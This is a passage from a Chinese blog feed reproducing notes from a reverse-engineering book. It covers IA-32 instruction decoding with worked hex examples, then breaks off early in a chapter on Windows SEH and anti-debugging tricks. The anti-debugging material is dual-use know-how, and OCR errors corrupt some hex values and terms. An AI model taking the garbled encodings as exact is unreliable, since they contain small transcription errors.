Prefixes）是一个可选项目，后面岀现特定操作码时将补充说明其含义。</p><p>下面举个简单的例子。</p><p>前缀项大小为1个字节（后面讲解“指令解析方法”（借助操作码映射解析）时会详细说明</p><p>Prefix 66的含义）。</p><h2 id="49-3-2操作码"><a href="#49-3-2操作码" class="headerlink" title="49.3.2操作码"></a>49.3.2操作码</h2><p>Opcode （ Operation Code,操作码）是必不可少的部分，用来表示实际的指令。</p><p>操作码长度为1〜3个字节，我们在常见的应用程序调试中遇到的操作码大部分都是1个字节，</p><p>有时也会遇到2个字节的操作码。3个字节长度的操作码主要用在MMX （ MultiMedia extension, 多媒体扩展）相关指令中，一般很少有机会接触到。操作码通常都带有操作数（Operand）,操作</p><p>数种类有寄存器、内存地址、常量（Contanst ）0指令中出现的ModR&#x2F;M与SIB选项辅助操作码确</p><p>定操作数。</p><p>操作码种类很多，解析时一般需要查看Intel用户手册的操作码映射。后面讲解“指令解析方</p><p>法”时会做一些解析操作码的练习。</p><h2 id="49-3-3-ModR-x2F-M"><a href="#49-3-3-ModR-x2F-M" class="headerlink" title="49.3.3 ModR&#x2F;M"></a>49.3.3 ModR&#x2F;M</h2><p>ModR&#x2F;M是个可选项，主要用来辅助说明操作码的操作数（操作数的个数、种类[寄存器、地</p><p>址、常量]）</p><p>ModR&#x2F;M项拥有1个字节（8位）长度，分为3部分，各部分含义如图49-7所示。</p><h2 id="49-3-4-SIB"><a href="#49-3-4-SIB" class="headerlink" title="49.3.4 SIB"></a>49.3.4 SIB</h2><p>SIB （ Scale-Index-Base ）也是一个可选项，用来辅助说明ModR&#x2F;M。操作码的操作数为内存</p><p>地址时，需要与ModR&#x2F;M项一起使用。</p><p>SIB项也拥有1个字节（8位）长度，分为3部分，各部分含义如图49-8所示。</p><h2 id="49-3-5位移"><a href="#49-3-5位移" class="headerlink" title="49.3.5位移"></a>49.3.5位移</h2><p>位移（Displacement）也是可选项，操作码的操作数为内存地址时，用来表示位移操作。</p><p>位移的长度为1、2、4字节。</p><h2 id="49-3-6立即数"><a href="#49-3-6立即数" class="headerlink" title="49.3.6立即数"></a>49.3.6立即数</h2><p>立即数（Immediate）也是一个可选项，操作码的操作数为常量时，该常量就被称为立即数。</p><p>立即数的长度为1、2、4字节。</p><h1 id="49-4指令解析手册"><a href="#49-4指令解析手册" class="headerlink" title="49.4指令解析手册"></a>49.4指令解析手册</h1><p>首先制作“指令解析手册”，然后借助该手册练习指令解析。</p><h2 id="49-4-1下载IA-32用户手册"><a href="#49-4-1下载IA-32用户手册" class="headerlink" title="49.4.1下载IA-32用户手册"></a>49.4.1下载IA-32用户手册</h2><p>Intel公司提供的用户手册对IA-32进行了详细说明。代码逆向分析中会经常参考该用户手册，</p><p>所以请从下面地址下载。</p><p><a href="http://www.intel.com/products/processor/manuals/">http://www.intel.com/products/processor/manuals/</a></p><p>进人页面下载这个文件。</p><p>Intel® 64 and IA-32 Architectures Software Developer’s Manuals Volume 2A.pdf</p><p>Intel® 64 and IA-32 Architectures Software Developer’s Manuals Volume 2B.pdf</p><h2 id="49-4-2打印指令解析手册"><a href="#49-4-2打印指令解析手册" class="headerlink" title="49.4.2打印指令解析手册"></a>49.4.2打印指令解析手册</h2><p>下载Intel用户手册后，其中有些表格是解析指令时需要参考的，请将下面列岀的表格打印</p><p>出来。</p><p>上面打印的资料用得多了、泛黄的时候，各位也就成了解析IA-32指令的高手。</p><p>我几年间一直使用一部自制的指令手册，有人问有关指令解析的问题时，我就会翻阅</p><p>它并给出解答。翻阅得多了，就有了感觉，哪些内容在哪页一清二楚，所以查起来非</p><p>常快。我尊敬的一位前辈也有这样的参考资料，当时看上去都用旧了。从某种意义上</p><p>说，这种使用痕迹就像一把测量逆向分析人员“年轮”的尺子。希望各位也打印一份</p><p>这样的资料，需要的时候随时翻阅查看（参考图49-9）</p><h1 id="49-5指令解析练习"><a href="#49-5指令解析练习" class="headerlink" title="49.5指令解析练习"></a>49.5指令解析练习</h1><p>我们从本节开始学习IA-32指令解析方法。</p><h2 id="49-5-1操作码映射"><a href="#49-5-1操作码映射" class="headerlink" title="49.5.1操作码映射"></a>49.5.1操作码映射</h2><p>首先解析1条长度为1个字节的操作码指令。</p><p>41 INC ECX</p><p>查看前面打印岀的操作码手册（或者Intel Manual Vol.2B ）中的“TableA-2. One-byte Opcode Map”。</p><p>解析指令时，最先要查看表格的名称是否为“Table A-2. One-byte Opcode Map:（00H-F7H）*”。</p><p>然后将要查找的操作码41拆分为4与1，再在操作码映射中将它们分别作为表格的行与列进行查</p><p>找。从查找的结果看，操作码41对应的指令为INC，操作数为ECX（同一方格中的REX.B是64位</p><p>系统专用操作数，忽略即可）。所以指令41最终被解析为INC ECX指令，使用图49-6中的IA-32指</p><p>令格式表示如下：</p><p>图49-10中INC指令的上标为i64, REX指令的上标为o64,它们的含义在操作码</p><p>用户手册的 “Table A-l. Superscripts Utilized in Opcode Tables” 中给出了 讲解3根据表</p><p>格中的说明，i64表示不在64位模式中使用，o64表示只在64位模式中使用。所以操</p><p>作码4047在32位模式中作为INC指令使用，在64位模式（o64）中用作REX前缀。</p><p>由于这里解析的是IA-32指令，所以应该解析为INC指令。操作数亦是如此，在32位</p><p>模式中要选择ECX，在64位模式中要选择REX.B。</p><h2 id="49-5-2操作数"><a href="#49-5-2操作数" class="headerlink" title="49.5.2操作数"></a>49.5.2操作数</h2><p>下面继续通过练习来学习操作数的形态结构。</p><p>使用前面的方法在Table A-2操作码映射中查找指令的第一个字节68,如图所示。</p><p>从图49-11中可以看到，操作码68对应于PUSH Iz，为带有1个操作数的PUSH指令。</p><p>提示————————————————————————–</p><p>Table A-2 One-byte Opcode Map内容繁多，在Intel用户手册中占了不少分量，图</p><p>49-11是其中一部分。</p><p>Iz用来表示操作数的类型，把握其含义即可准确解析整条指令。大写字母I指寻址方法</p><p>（Addressing Method ），小写字母z指操作数类型（ Operand Type ），A.2.1 Codes for Addressing Method</p><p>与A.2.2 Codes for Operand Type中分别对它们进行了说明。</p><p>常用寻址方法整理如表49-2所示。</p><p>指示寻址方法的大写字母I代表Immediate （立即数）。若想知道立即数的大小，还要参考操作</p><p>数类型。</p><p>常用操作数类型整理如表49-3所示。</p><p>指示操作数类型的小写字母z在32位模式下表示的大小为DWORD （32位，4个字节）。综合</p><p>以上信息，操作码68对应的PUSH Iz指令中，Iz （操作数格式）表示大小为4个字节（32位）的立</p><p>即数，所以继续读取68之后的4个字节（ 0040B440 ），整条指令最终解析为PUSH 0040B4A0，用</p><p>IA-32指令格式表示如下：</p><p>以上只是解析指令的“热身”练习，下面正式学习指令解析方法。</p><h2 id="49-5-3-ModR-x2F-M"><a href="#49-5-3-ModR-x2F-M" class="headerlink" title="49.5.3 ModR&#x2F;M"></a>49.5.3 ModR&#x2F;M</h2><p>首先学习包含ModR&#x2F;M的指令解析方法。</p><p>89C1 MOV ECX,EAX</p><p>先在操作码映射中查找Opcode 89，如图49-12所示。</p><p>从操作码映射中可以看到，Opcode89对应MOVEv，Gv指令，带有2个操作数，第一个操作数</p><p>的格式为Ev，第二个操作数格式为Gv。</p><p>由表49-3可知，操作数类型中的小写字母v表示操作数的大小为32位（4个字节）。上面指令</p><p>中2个操作数的大小均为4个字节。接下来需要把握大写字母E与G代表的含义，这样才能准确解</p><p>析整条指令。根据表49-2中的说明，大写字母E是寄存器或内存地址形式的操作数，大写字母G</p><p>只能是寄存器形式的操作数。操作数形式为E或G时，操作码后面一定存在ModR&#x2F;M选项。</p><p>了解操作码后就能掌握操作码映射中的指令格式（Mnemonic、操作数个数、操作</p><p>数大小）。若操作数的寻址方法为E或G，则分析操作码后面的ModR&#x2F;M即可准确解析</p><p>操作数。</p><p>所以，整条指令89C1中，紧跟在Opcode 89后面的1个字节Cl即为ModR&#x2F;M选项。ModR&#x2F;M表</p><p>格是指操作码手册中的Table 2-2. 32-Bit Addressing Forms with the ModR&#x2F;M Byte，如图49-13所7K。</p><p>图49-13中的ModR&#x2F;M表看上去比操作码映射复杂得多，但熟悉原理后就能很容易地掌握其使</p><p>用方法。ModR&#x2F;M长度为1个字节，在图49-13的ModR&#x2F;M表中的[ModR&#x2F;M]区域内，从00开始到FF</p><p>结束。前面讲解ModR&#x2F;M时提到过，它按比特位分为3个部分，分别为Mod、Reg、R&#x2F;M（参考ModR&#x2F;M</p><p>说明）。下面以ModR&#x2F;M Cl为例讲解。</p><p>ModR&#x2F;M拆分后的各值在图49-13中的Mod、REG、R&#x2F;M部分表示出来（二进制）。请各位在</p><p>图49-13中查找C1,分别确认Mod、Reg、R&#x2F;M的值。操作数的寻址方法为E时，操作数的形式在</p><p>图49-13左侧的[E]区域（图49-13表的左侧部分）中显示。</p><p>提示————————————————————————–</p><p>寻址方法“E”代表内存地址或寄存器。从图49-13中可以看到，ModR&#x2F;M值为</p><p>00〜BF时，显示在[E]区域中的操作数为内存地址；ModR&#x2F;M值为C0〜FF时，出现在[E]</p><p>区域中的操作数为寄存器。</p><p>操作数的寻址方法为G时，操作数的形式出现在图49-13中的[G]区域（图49-13的表上端</p><p>部分）。</p><p>提示————————————————————————–</p><p>寻址方法“G”仅有寄存器形式，表49-2中已经说明。从图49-13可以看到，根</p><p>据ModR&#x2F;M的Reg值（000〜111 ）,从EAX变化到EDI （操作数大小为32位时）。</p><p>再回来解析指令89C1，Opcode 89对应MOV Ev，Gv指令，且带有ModR&#x2F;M值。ModR&#x2F;M为C1,</p><p>从图49-13中可以得知，Ev&#x3D;ECX, Gv&#x3D;EAX。所以，指令89C1最终解析为MOV ECXJEAX。</p><p>提示————————————————————————–</p><p>大写字母E与G表示寻址方法，在图49-13中分别出现在[E]区域与[G]区域。小写</p><p>字母v表示操作数类型，32位计算中操作数的大小也为32位。根据这些信息在图49-13</p><p>中查找ModR&#x2F;M值Cl，可知Ev、Gv分别为ECX’ EAX。</p><p>用IA-32指令格式表示如下：</p><p>[Prefixes][Opcode][ModR&#x2F;M][SIB][Displacement][Immediate]</p><h2 id="49-5-4-Group"><a href="#49-5-4-Group" class="headerlink" title="49.5.4 Group"></a>49.5.4 Group</h2><p>Gmup指令语句将操作码与ModR&#x2F;M组合起来，使操作码最多可以表示出8种形式的指令</p><p>（Mnemonic ）0灵活使用Group指令虽然会使解析变得有些复杂，却能较好地扩展操作码映射。</p><p>83C3 12 ADD EBX,12</p><p>首先在操作码映射中查找83对应的指令形式。</p><p>从图49-14可知，Opcode 83对应的指令为Grp 1 Ev，Ib，带有2个操作数，形式分别为Ev、lb。</p><p>由前面的讲解可知，Ev代表4个字节的寄存器（或者内存地址），lb代表1个字节的立即数（根据</p><p>表49-3可知，操作数类型的b代表字节大小）</p><p>提示————————————————————————–</p><p>到现在为止，解析上述语句时仍未出现指令（Mnemonic ）,只是表示成了 Immediate</p><p>Grp 1的形式，即在多种形式的Group中它是Immediate Grp 1。1条操作码中包含多种</p><p>指令，根据后面的ModR&#x2F;M可以最终确定相应指令。前面图中，Immediate Group 1</p><p>的第二个操作数是立即数。该Group中的指令用来计算（ADD、SUB, XOR等）这类</p><p>立即数。</p><p>操作数中含有Ev符号，所以紧跟在后面的1个字节（C3 ）为ModR&#x2F;M。操作码为Group指令语</p><p>句时，后面必须紧跟ModR&#x2F;M。综合目前获取的各种信息，指令83C312解析如下：</p><p>到现在还是无法确切知道指令（Mnemonic）与操作数的内容。分析ModR&#x2F;M “C3” 后即可</p><p>准确解析上述指令（解析与顺序无关，但从左到右解析起来会更简便）。</p><p>首先参考Group指令表查看对应指令（Mnemonic）。Group指令表是指操作码用户手册中的</p><p>Table A-6. Opcode Extentions for One- and Two Opcodes by Group Number,如图49-15所示。</p><p>图49-15中操作码为83,所以只看Group 1项目即可。并且，由于ModR&#x2F;MC3的Reg值为000（二</p><p>进制），所以对应的指令（Mnemonic ）为ADD。综合以上分析，指令83C312解析如下：</p><p>接下来，先确定第一个操作数。在ModR&#x2F;M表中查找C3值。</p><p>由图49-16可知，ModR&#x2F;M “C3” 的Ev对应的值为EBX。</p><p>从图49-14可知，第一个操作数的格式为Ev。在图49-13、图49-16的[E]区域中</p><p>查找寻址方法符号E对应的值，有EBX、BX、BL这3种，再加上操作数类型符号是</p><p>小写字母v,所以最终选择4个字节的EBX寄存器（该处的E只能为通用寄存器，不</p><p>可能为MM3与XMM3寄存器）。也不可以选择[G]区域中的EAX值，[G]区域要在寻</p><p>址方法符号为G时使用。ModR&#x2F;M表比较复杂，必须准确理解其使用方法。</p><p>至此，指令83C312解析如下：</p><p>83C312 • ADD EBX, lb</p><p>第二个操作数的符号为Ib，表示1个字节大小的立即数，直接读取ModR&#x2F;M后面的1个字节（12 ）</p><p>即可。综上所述，指令83C312最终解析为如下形式：</p><p>83C312 - ADD EBX, 12</p><p>用IA-32指令格式表示如下：</p><p>[Prefixes][Opcode][ModR&#x2F;M][SIB][Displacement][Immediate]</p><h2 id="49-5-5前缀"><a href="#49-5-5前缀" class="headerlink" title="49.5.5前缀"></a>49.5.5前缀</h2><p>本小节介绍含Prefix （前缀）的指令解析方法。有些前缀（ 66,67 ）对整条指令的解析有着重</p><p>要影响，所以必须掌握。</p><p>66:81FE 3412 CMP SI,1234</p><p>首先在Table A-2 Opcode Map中查找 “66”。</p><p>由图49-17可知，“66” 表示操作数大小（前缀）。更准确地说，它表示的是Operand-Size Override</p><p>Prefix, Prefix 66的含义为“将32位大小的操作数识别为16位大小（或者将16位大小的操作数识别</p><p>为32位大小）”。紧接在Prefix 66后面的1个字节81为操作码，在操作码映射中查找 “81”，如图</p><p>49-18所示0</p><p>Opcode 81为Group指令，带有2个操作数（Ev, Iz ）。符号Ev—般表示32位的寄存器（或内存</p><p>地址），而符号Iv表示32位立即数（参考操作码用户手册A.2.1&amp;A.2.2）。但因前面有Operand-Size</p><p>Override Prefix 66,故操作数的大小分别由32位变为16位。操作数格式中出现符号E,则表示后面</p><p>跟有ModR&#x2F;M字节（FE）。综合以上分析，指令6681FE3412解析如下（请注意：Prefix 66使操作</p><p>数大小变为16位）：</p><p>6681FE 3412 • Grpl Ev, Iz （Operand Size &#x3D; 16 bit）</p><p>要想得到准确指令与操作数，还要分析ModR&#x2F;M值FE代表的含义。</p><p>Ex） ModR&#x2F;M &#x3D; FE</p><p>FE的二进制表示&#x3D;11111110</p><p>拆分ModR&#x2F;M &#x3D; 1111111110 （Mod: 11, Reg:111, R&#x2F;M:110）</p><p>接着在Table A-6中查看Group指令，确定其代表的具体指令，如图49-19所示。</p><p>由图49-19中的Group表可知，Opcode 81 （Group 1 ）中，ModR&#x2F;M的REG （值为111 ）对应的</p><p>实际指令为CMP。</p><p>6681FE 3412 CMP Ev, Iz （Operand Size &#x3D; 16 bit）</p><p>接下来开始确定第一个操作数。在ModR&#x2F;M表格中查找“FE”，如图49-20所示</p><p>从图49-20中可以看到，ModR&#x2F;M “FE”的Ev符号对应值为ESI,但是受Prefix 66的限制，要</p><p>选择16位的SI。</p><p>6681FE 3412 - CMP SI, Iz （Operand Size &#x3D; 16 bit）</p><p>第二个操作数的符号为Iz，原指4个字节（32位）的立即数值，但受Prefix 66的影响，其变为</p><p>2个字节（16位）大小，即获取ModR&#x2F;M后面的2个字节（1234）。所以整条指令最终解析如下：</p><p>6681FE 3412 • CMP SI, 1234</p><p>用IA-32指令格式表示如下：</p><p>[Prefixes][Opcode][ModR&#x2F;M][SIB][Displacement][Immediate]</p><h2 id="49-5-6双字节操作码"><a href="#49-5-6双字节操作码" class="headerlink" title="49.5.6双字节操作码"></a>49.5.6双字节操作码</h2><p>本小节学习操作码为双字节时的指令解析方法。单字节操作码不够用时，可以将其扩展为双</p><p>字节。双字节操作码中第一个字节恒为0F，故其在操作码映射中的查找方式与单字节操作码是一</p><p>样的。</p><p>0F85 FA1F00O0 JNZ XXXXXXXX</p><p>先在单字节操作码映射中查找指令的第一个字节（0F）,如图49-21所示。</p><p>由上表可知，“OF”为双字节操作码的Escape符号，指示继续在Table A-3中查找双字节操作</p><p>码。双字节操作码映射（即TableA-3 ）在Intel用户手册中的分量是单字节的两倍，如图49-22所示。</p><p>从图49-22的表格标题可以看到，第一个字节为 “OF”。查找第二个字节85,可以看到它对应</p><p>的指令为JNE （ JNZ ）。</p><p>提示————————————————————————–</p><p>Jcc为Conditional Jump （条件跳转）指令，一般这种条件跳转指令之前都有比较</p><p>语句（CMP、TEST）,并根据比较的结果决定是否跳转。Jcc指令有多种形式，示例中</p><p>的0F85被解析为JNE （ Jump Not Equal）或JNZ （ Jump Not Zero ）指令（两条指令含</p><p>义相同）。Jcc指令（ 0F80〜0F8F ）的操作数在图49-22中显示为“Long-displacement”。</p><p>操作数说明中，一般Long表示4个字节（32位），Short表示1个字节（ 8位）。所以，</p><p>Jcc指令的操作数为4字节大小的Displacement （移位值）。</p><p>由于JNE指令的操作数为4个字节大小的移位值，继续读取操作码后面的4个字节</p><p>（00001FFA）,整条指令解析如下：</p><p>以上指令中的移位值00001FFA为相对位移，加上当前的EIP才能准确算出跳转地</p><p>址。比如，上述指令的地址为401000,执行指令后，EIP值为401006 （增加6个字节</p><p>（指令长度）），那么实际跳转的地址为403000 （JNE 403000），它是EIP值（ 401006 ）</p><p>与移位值（1FFA ）相加的结果。调试中会经常遇到“相对位移”这一术语，希望各位</p><p>理解其含义。</p><h2 id="49-5-7移位值-amp-立即数"><a href="#49-5-7移位值-amp-立即数" class="headerlink" title="49.5.7移位值&amp;立即数"></a>49.5.7移位值&amp;立即数</h2><p>若指令中同时存在移位值&amp;立即数，该如何解析呢？下面学习这种指令的解析方法。</p><p>首先在操作码映射中查找“C7”，如图49-33所示。</p><p>Opcode C7对应Group 11 MOV指令，带有2个操作数（Ev，Iz ）。所以上述指令解析如下：</p><p>岀现Group指令或操作数形式中有E、G时，操作码之后必跟着ModR&#x2F;M选项，上述指令中</p><p>ModR&#x2F;M的值为05。</p><p>接着在Group指令表（Table A-6）中查找其对应的实际指令（Mnemonic）,如图49-24所示</p><p>Group 11中ModR&#x2F;M的Reg值（ 000 ）对应的指令为MOV,且在Group 11中仅有一个MOV指令</p><p>（故图49-23中岀现了 “Groupll-MOV”的标识）。</p><p>C705 00CF4000 01000100 - MOV Ev, Iz</p><p>接下来确定第一个操作数（Ev）,在ModR&#x2F;M表（Table 2-2）中查找 “05”，如图49-25所示。</p><p>第一个操作数（Ev）为“disp32”，代表32位大小的移位值。ModR&#x2F;M在00〜BF范围内时，Ev</p><p>形式的操作数表示内存地址（ModR&#x2F;M在C0〜FF范围内时，Ev®式的操作数表示寄存器）。所以,</p><p>ModR&#x2F;M之后的4个字节（ 0040CF00 ）为移位值，表示内存地址（表示地址时一定要用上[]中括号）。</p><p>C705 00CF4000 01000100 - MOV [0040CF00], Iz</p><p>最后，第二个操作数Iz为4个字节大小的立即数，从移位值之后读取4个字节（00010001 ）</p><p>即可。</p><p>C705 0OCF4000 01000100 • MOV [0040CF00], 10001</p><p>上述指令表示向40CF00地址中放人10001值，使用IA-32指令格式表示如下：</p><p>[Prefixes][Opcode][ModR&#x2F;M][SIB][Displacement][Immediate]</p><h2 id="49-5-8-SIB"><a href="#49-5-8-SIB" class="headerlink" title="49.5.8 SIB"></a>49.5.8 SIB</h2><p>操作数指向内存地址时，SIB （ Scale, Index、Base）用来辅助寻址。指令中含有SIB时，其</p><p>本身会变得较为复杂。换言之，如果掌握了含有SIB的指令解析方法，你就达到了大师级别。</p><p>8B0C01 MOV ECX, [EAX+ECX]</p><p>首先在操作码映射中查找 “8B”，如图49-26所示。</p><p>由图49-26可知，Opcode 8B对应的指令为MOV Gv，Ev，带有2个操作数，第一个操作数为Gv</p><p>形式，是一个4字节的寄存器；第二个操作数为E4式，是一个4字节的寄存器或内存地址。操作</p><p>数的寻址方法为G、EB寸，操作码后会跟着ModR&#x2F;M选项。解析出该ModR&#x2F;M即可准确解析操作数。</p><p>上述指令中ModR&#x2F;M为0C，在ModR&#x2F;M表中查找，如图49-27所示。</p><p>第一个操作数Gv对应的值为ECX，第二个操作数Ev对应的值为符号表示需要</p><p>SIB字节来辅助表示准确地址。综合以上分析，上述指令解析如下：</p><p>第二个操作数的符号[-][-]指向内存地址，要准确解析它需要用到SIB字节，用更直观的方</p><p>式表示如下：</p><p>重写上述指令如下：</p><p>这种表7K方法更加直观。接下来在SIB表中查找Reg.A与Reg.B，如图49-28所示。</p><p>前面的指令中，SIB的值为01，SIB表就是操作码用户手册中的Table 2-3。</p><p>査看SIB表的方法与查看ModR&#x2F;M表的方法类似，先找到SIB值，然后在表顶部的[Reg.A]区域</p><p>获取Reg.A寄存器，然后在表左侧的[Reg.B]区域获取Reg.B寄存器。图49-28中与SIB 01对应的</p><p>Reg.A为ECX，Reg.B为EAX。所以指令最终解析如下：</p><p>用IA-32指令格式表示如下：</p><p>操作数为（复杂形式的）内存地址时，SIB就像这样用来辅助寻址。接下来解析一条带有更</p><p>复杂的SIB选项的指令。</p><p>如图49-29所示，Opcode 8D对应的指令为LEA Gv，M。</p><p>LEA指令是“Load Effective Address”的缩写，是“取有效地址指令”。第一个操作数为Gv</p><p>形式，是4个字节大小的寄存器；第二个操作数为M形式，仅表示内存地址（参考表49-2）。</p><p>由于操作数的寻址方法为G、M，所以操作码后面跟着ModR&#x2F;M字节，分析后面的ModR&#x2F;M即</p><p>可得到准确的操作数值。上述指令中ModR&#x2F;M值为84,在Table 2-2中查找它，如图49-30所示。</p><p>第一个操作数Gv形式为EAX,第二个操作数M形式为[–][–]+disp32。</p><p>各位现在已经非常熟悉ModR&#x2F;M表格了吧？在表格上端求G形式的值，在表格左</p><p>侧求E或M形式的值。</p><p>综合以上分析，上述指令解析如下</p><p>第二个操作数中的[–][–]+disp32指的是内存地址，要想准确解析，需要使用后面的SIB字节</p><p>与32位的移位值。使用更直观的方式表示[–][–]+disp32如下：</p><p>用更直观的方式解析上述指令。</p><p>8D8428 B1354000 - LEA EAX, [（Reg. A）+（Reg. B） + disp32]</p><p>接下来查看SIB表以获取Reg.A与Reg.B对应的值。因SIB为28,故Reg.A为EAX, Reg.B为EBP</p><p>（参考图49-31 ）。</p><p>上述指令中disp32的值为SIB后的004035B1。综合以上所有分析，整条指令最终解析如下:</p><p>8D8428 B1354000 LEA EAX, [EAX+EBP+4035B1]</p><h1 id="49-6指令解析课外练习"><a href="#49-6指令解析课外练习" class="headerlink" title="49.6指令解析课外练习"></a>49.6指令解析课外练习</h1><p>若想完全掌握指令解析方法，需要大量练习。反复看前面的练习示例，熟悉解析方法后，在</p><p>OllyDbg调试器中打开并运行notepad.exe程序，如图49-32所示。</p><p>参考前面打印岀的操作码用户手册，将区域[1]中的指令逐条解析为反汇编代码（请先隐藏</p><p>OllyDbg调试器中的反汇编窗口）。指令解析的成功率达到99%以上后，再看区域[2]中的机器代码，</p><p>将它们解析为反汇编代码。通过这些训练，各位会迅速成长为IA-32指令解析高手。</p><h1 id="49-7小结"><a href="#49-7小结" class="headerlink" title="49.7小结"></a>49.7小结</h1><p>本章主要讲解IA-32指令的解析方法，刚接触它的读者朋友可能会觉得有些难度。但若完全</p><p>掌握了指令解析方法，逆向技术水平就会达到中级以上。</p><p>我主要使用IA-32指令来编写查杀恶意代码的函数。检测变形病毒（Polymorphic Vims）时，</p><p>必须探测岀Polymorphic引擎中产生的指令类型，这时就需要分析人员具有丰富的指令知识。此外，</p><p>了解指令结构也有助于提高代码调试水平。掌握IA-32指令相关知识对于编写“打补丁”代码、</p><p>分析漏洞Shell代码都非常有帮助。当然，掌握IA-32指令解析方法对于提高各位的逆向分析技术</p><p>水平也有相当大的帮助。</p><p>以上内容仅涉及Intel用户手册中的极少部分。若想深入学习有关IA-32指令的知</p><p>识，请各位认真研读 Intel® 64 and IA-32 Architectures Software Developer，s Manuals （与</p><p>指令解析相关的部分为Vol. 2A-2.K Vol.2B-Appendix A ）D</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第48章 SEH</title>
    <link href="/1999/04/08/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC48%E7%AB%A0%20SEH/"/>
    <url>/1999/04/08/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC48%E7%AB%A0%20SEH/</url>
    
    <content type="html"><![CDATA[<p>第48章 SEH</p><p>SEH是Windows操作系统默认的异常处理机制。逆向分析中，SEH除了基本的异常处理功能外，还大量应用于反调试程序。本章将学习SEH相关知识。</p><h1 id="48-1-SEH"><a href="#48-1-SEH" class="headerlink" title="48.1 SEH"></a>48.1 SEH</h1><p>基本说明</p><p>SEH是Windows操作系统提供的异常处理机制，在程序源代码中使用<code>__try、__except、__finally</code>关键字来具体实现。本章我们将从代码逆向分析角度来介绍SEH，并通过练习示例详细了解SEH的基本工作原理及其在反调试中的具体使用方法。</p><blockquote><p>SEH与C中的try、catch异常处理具有不同结构，请各位不要混淆。从时间上看， 与C的try、catch异常处理相比，微软先创建出了 SEH机制，然后才将它搭载到VC中。所以SEH是一种从属于VC开发工具和Windows操作系统的异常处理机制。</p></blockquote><h1 id="48-2-SEH练习示例-1"><a href="#48-2-SEH练习示例-1" class="headerlink" title="48.2 SEH练习示例#1"></a>48.2 SEH练习示例#1</h1><p>先简单介绍练习示例程序seh.exe,该程序故意触发了内存非法访问（Memory Access Violation）异常，然后通过SEH机制来处理该异常。并且使用PEB信息向程序添加简单的反调试代码，使程序在正常运行与调试运行时表现出不同的行为动作。</p><blockquote><p>示例程序seh.exe并没有相应的源代码，其编写过程如下：先使用VC++编写一个空的main()函数，然后选择合适的选项编译，生成一个不执行任何动作的PE文件。使用OllyDbg打开该文件，借助调试器的汇编功能添加汇编代码，最终保存为seh.exe文件。</p></blockquote><blockquote><p>本示例程序在Windows XP&amp;7（32位）中正常运行。</p></blockquote><h2 id="48-2-1正常运行"><a href="#48-2-1正常运行" class="headerlink" title="48.2.1正常运行"></a>48.2.1正常运行</h2><p>seh.exe程序非常简单，双击运行，弹出一个消息框，显示“Hello:)” 字符串，如图48-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321140819956.png#crop=0&crop=0&crop=1&crop=1&id=yX7mu&originHeight=214&originWidth=201&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-1 运行seh.exe弹出消息框"></p><blockquote><p>表面上程序正常运行，其实进程内部已经发生了异常，但由于使用SEH机制进行了处理，所以程序运行正常</p></blockquote><h2 id="48-2-2调试运行"><a href="#48-2-2调试运行" class="headerlink" title="48.2.2调试运行"></a>48.2.2调试运行</h2><p>使用OllyDbg调试器打开seh.exe示例程序，如图48-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321140925736.png#crop=0&crop=0&crop=1&crop=1&id=kyTFL&originHeight=755&originWidth=1666&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-2 使用OllyDbg调试器打开seh.exe"></p><p><strong>发生异常导致调试暂停</strong></p><p>在OllyDbg中打开seh.exe程序后按F9键运行，发生非法访问异常后暂停调试，如图48-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321143515074.png#crop=0&crop=0&crop=1&crop=1&id=yFf7c&originHeight=756&originWidth=1645&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-3 调试中发生非法访问异常"></p><p>401019地址处添加的<code>MOV DWORD PTR DS:[EAX],1</code>指令用来触发异常，当前EAX寄存器的值为0，所以该指令的实际含义是向内存地址0处写入值1。但试图向未分配的内存地址0处写入某个值时，就会触发内存非法访问异常。</p><blockquote><p>内存地址0虽然属于seh.exe进程的用户内存区域，但由于是未分配的空间，所以无法随意访问。查看OllyDbg的内存映射（View-Memory菜单），可以看到进程中内存地址0被标识为未分配区域（参考图48-4）。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321142812128.png#crop=0&crop=0&crop=1&crop=1&id=uRq93&originHeight=242&originWidth=1205&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-4 内存映射"></p><p>如上所述，访问未分配的内存区域时，就会触发非法访问异常。</p><p>那么，为什么被调试进程发生异常时会暂停呢？这只是意味着运行的时候很正常，下面仔细分析原因。</p><p><strong>发生异常时调试器运行</strong></p><p>在图48-3中查看OllyDbg的状态窗口，可以看到如下警告语句：</p><p><code>“Access violation when writing to [00000000] - use Shift+F7/F8/F9 to pass exception to program”</code></p><p>即在内存0处发生写入异常，若想将异常抛给程序，请使用Shift+F7&#x2F;F8&#x2F;F9组合键。</p><p>其中，“将异常抛给程序”是什么意思呢？暂且放下诸多疑问，根据调试器给出的提示按Shift+F9键继续运行程序。调试运行开始后弹岀消息对话框，如图48-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC48%E7%AB%A0%20SEH.assets/image-20220321143549446.png#crop=0&crop=0&crop=1&crop=1&id=ycX0j&originHeight=215&originWidth=242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=" alt="图48-5 